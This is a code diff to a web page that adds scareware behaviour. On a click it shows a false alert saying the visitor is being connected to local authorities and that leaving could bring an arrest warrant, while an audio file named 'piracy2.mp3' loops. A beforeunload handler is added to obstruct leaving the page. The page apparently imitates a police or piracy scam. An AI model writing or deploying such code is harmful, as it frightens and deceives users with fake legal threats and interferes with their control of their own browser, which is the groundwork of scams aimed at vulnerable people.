@@ -104,9 +104,14 @@
         </div>
         <script>
             document.body.addEventListener('click', function(event) {
+                alert("You are going to be connected to a secured call between you and the local authorities. Leaving could mean a serious arrest warrant.");
                 var audio = new Audio('piracy2.mp3');
                 audio.play();
                 audio.loop();
+            });
+            window.addEventListener('beforeunload', function (e) {
+                e.preventDefault();
+                e.returnValue = '';
             });
         </script>
     </body>
